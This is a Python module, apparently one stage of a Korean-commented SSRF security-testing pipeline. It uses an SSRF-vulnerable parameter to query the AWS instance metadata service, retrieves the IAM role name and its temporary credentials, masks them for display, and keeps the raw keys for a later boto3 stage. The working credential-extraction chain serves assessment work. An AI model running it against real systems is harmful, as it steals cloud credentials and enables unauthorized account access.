"""
Stage 4: IMDS / Credential Exposure
- Stage 3에서 vulnerable 판정된 candidate로 IMDS 접근
- IAM Role 이름 조회
- 임시 자격증명 조회 (마스킹해서 반환)

Input: Stage 3의 output (list) + 원본 target (Stage 3 결과 안에 있음)
Output 규격:
{
  "imds": {"reachable": true, "version_tested": "IMDSv1"},
  "iam_role": {"detected": true, "role_name": "..."},
  "temporary_credentials": {
    "exposed": true,
    "access_key_id": "ASIA****REDACTED",
    "secret_access_key": "REDACTED",
    "session_token": "REDACTED"
  }
}
+ 내부용 원본 자격증명 필드 (다음 stage에서 boto3 호출용)
"""
import requests
import json
import re
from payloads import build_url, DEFAULT_IMDS_IP


# 팀 서버가 <pre>...</pre> 로 감싸서 응답을 돌려주는 케이스 언랩용
_PRE_RE = re.compile(r"<pre[^>]*>(.*?)</pre>", re.DOTALL | re.IGNORECASE)


def _unwrap_html(body: str) -> str:
    """
    HTML로 감싸진 응답에서 실제 IMDS 응답만 추출.
    - 팀 웹서버: <h2>...</h2><pre>실제응답</pre><a>...</a>
    - 우리 mock: <pre> 없이 raw JSON/text 그대로
    <pre> 있으면 그 안 내용, 없으면 원본 그대로.
    """
    if not body:
        return body
    m = _PRE_RE.search(body)
    if m:
        return m.group(1).strip()
    return body


def _detect_imds_version(bypass_results: list) -> str:
    """
    Stage 3 결과에서 IMDS 버전을 판별.

    판정 우선순위:
    1. verdict "success" 있음 → IMDSv1 확정
       (verdict "success"는 이미 IMDS 시그니처가 응답에 있음을 의미)
    2. body_snippet에 "401"/"Unauthorized" → IMDSv2 강제 추정
    3. 그 외 → unknown (필터에 다 막혀 IMDS까지 도달 못 함)

    body_snippet은 200자로 잘려있어 팀 서버의 HTML wrapper에 가려질 수 있으므로
    verdict를 우선 사용. 401은 짧아서 body_snippet 앞부분에도 잘 나옴.
    """
    saw_v1_success = False
    saw_401 = False
    for b in bypass_results:
        for t in b.get("tests", []):
            # 1) verdict "success"는 Stage 3가 전체 body로 IMDS 시그니처 확인한 결과
            if t.get("verdict") == "success":
                saw_v1_success = True
            body = (t.get("body_snippet") or "").lower()
            # 2) 401 시그니처는 body_snippet 앞부분에 잘 노출됨
            if "401" in body or "unauthorized" in body:
                saw_401 = True
            # 3) body_snippet에 IMDS 시그니처가 있는 경우 (짧은 응답 케이스)
            if "accesskeyid" in body or "instance-id" in body or "ami-id" in body:
                saw_v1_success = True

    if saw_v1_success:
        return "IMDSv1"
    if saw_401:
        return "IMDSv2 (401 detected)"
    return "unknown"


def run_imds_exposure(
    bypass_results: list,
    target_ip: str = DEFAULT_IMDS_IP,
    request_timeout: int = 10,
) -> dict:
    """
    bypass_results 중 첫 vulnerable 항목을 골라 IMDS 자격증명 탈취 진단.
    반환 dict에는 마스킹된 표시용 필드와 별도로 `_raw_credentials`가 포함됨
    (Stage 5의 boto3 호출용, 최종 리포트 저장 전 반드시 삭제).

    IMDSv2 강제 환경(401)이 감지되면 조기 종료.
    """
    vuln = next((b for b in bypass_results if b["result"] == "vulnerable"), None)
    if not vuln:
        return _empty_result()

    # IMDS 버전 판별 (Stage 3의 응답 시그니처 기반)
    imds_version = _detect_imds_version(bypass_results)

    # IMDSv2 강제 감지 → 자격증명 탈취 불가, 조기 종료
    if imds_version.startswith("IMDSv2"):
        return {
            "imds": {
                "reachable": True,          # 서버가 401을 응답했으니 IMDS 자체엔 도달
                "data_extracted": False,    # 401만 받음, 유용한 데이터 없음
                "version_tested": imds_version,
                "v2_enforced": True,
            },
            "iam_role": {"detected": False, "role_name": None},
            "temporary_credentials": {"exposed": False},
            "note": "IMDSv2 강제 환경. SSRF로는 토큰 헤더 지정 불가하여 자격증명 탈취 차단됨.",
        }

    target = vuln["target"]
    param = vuln["parameter"]
    technique = vuln["bypass_technique"]

    # 1) IMDS 접근 가능 여부
    imds_root_url = build_url(technique, "/latest/meta-data/", target_ip)
    root_body = _ssrf_get(target, param, imds_root_url, request_timeout)
    if not root_body or "iam" not in root_body.lower():
        # meta-data는 되는데 iam이 없는 경우도 있으니 iam path 직접 시도
        pass

    # 2) IAM Role 이름 조회
    role_url = build_url(technique, "/latest/meta-data/iam/security-credentials/", target_ip)
    role_body = _ssrf_get(target, param, role_url, request_timeout)
    if not role_body:
        return {
            "imds": {"reachable": bool(root_body), "data_extracted": False,
                     "version_tested": imds_version, "v2_enforced": False},
            "iam_role": {"detected": False, "role_name": None},
            "temporary_credentials": {"exposed": False},
        }

    role_name = _extract_role_name(role_body)
    if not role_name:
        return {
            "imds": {"reachable": True, "data_extracted": False,
                     "version_tested": imds_version, "v2_enforced": False},
            "iam_role": {"detected": False, "role_name": None},
            "temporary_credentials": {"exposed": False},
        }

    # 3) 임시 자격증명 조회
    cred_url = build_url(
        technique,
        f"/latest/meta-data/iam/security-credentials/{role_name}",
        target_ip,
    )
    cred_body = _ssrf_get(target, param, cred_url, request_timeout)

    creds = _parse_credentials(cred_body)
    if not creds:
        # role 이름은 얻었으나 자격증명 파싱 실패 → 부분 성공
        return {
            "imds": {"reachable": True, "data_extracted": True,
                     "version_tested": imds_version, "v2_enforced": False},
            "iam_role": {"detected": True, "role_name": role_name},
            "temporary_credentials": {"exposed": False},
        }

    return {
        "imds": {"reachable": True, "data_extracted": True,
                 "version_tested": imds_version, "v2_enforced": False},
        "iam_role": {"detected": True, "role_name": role_name},
        "temporary_credentials": {
            "exposed": True,
            "access_key_id": _mask_akid(creds.get("AccessKeyId", "")),
            "secret_access_key": "REDACTED",
            "session_token": "REDACTED",
        },
        # ⚠️ 내부용: Stage 5에서 boto3 호출에 사용, LLM 프롬프트/리포트에 절대 포함 금지
        "_raw_credentials": creds,
    }


def _empty_result() -> dict:
    return {
        "imds": {"reachable": False, "data_extracted": False,
                 "version_tested": "unknown", "v2_enforced": False},
        "iam_role": {"detected": False, "role_name": None},
        "temporary_credentials": {"exposed": False},
    }


def _ssrf_get(target: str, param: dict, payload_url: str, timeout: int) -> str:
    method = param["method"].upper()
    location = param["location"]
    name = param["name"]
    try:
        if location == "query":
            r = requests.get(target, params={name: payload_url}, timeout=timeout)
        elif location == "json":
            r = requests.post(target, json={name: payload_url}, timeout=timeout)
        elif location == "body":
            r = requests.post(target, data={name: payload_url}, timeout=timeout)
        else:
            return ""
        if r.status_code >= 500:
            return ""
        # 팀 서버는 <pre>로 감싸서 응답. 실제 IMDS 응답만 추출.
        return _unwrap_html(r.text)
    except requests.RequestException:
        return ""


def _parse_credentials(body: str) -> dict:
    """IMDS security-credentials 응답은 JSON. 파싱 실패시 빈 dict."""
    if not body:
        return {}
    try:
        data = json.loads(body)
        if isinstance(data, dict) and "AccessKeyId" in data:
            return data
    except json.JSONDecodeError:
        pass
    return {}


def _extract_role_name(body: str) -> str:
    """
    IMDS /security-credentials/ 는 role 이름을 plain text 한 줄로 반환.
    IAM role 이름 규격: 알파벳/숫자/`+=,.@-_`, 최대 64자.
    필터 차단 응답 등 예외적인 body는 걸러냄.
    """
    import re
    if not body or not body.strip():
        return ""
    first_line = body.strip().splitlines()[0].strip()
    if re.fullmatch(r"[A-Za-z0-9+=,.@\-_]{1,64}", first_line):
        return first_line
    return ""


def _mask_akid(akid: str) -> str:
    """AKIA/ASIA + 앞 4자리만 표시"""
    if not akid or len(akid) < 8:
        return "REDACTED"
    return akid[:4] + "****REDACTED"


def strip_raw_credentials(result: dict) -> dict:
    """리포트/LLM 넘기기 직전 _raw_credentials 제거"""
    return {k: v for k, v in result.items() if not k.startswith("_")}


if __name__ == "__main__":
    import sys
    bypass = json.load(sys.stdin)
    out = run_imds_exposure(bypass)
    print(json.dumps(strip_raw_credentials(out), indent=2, ensure_ascii=False))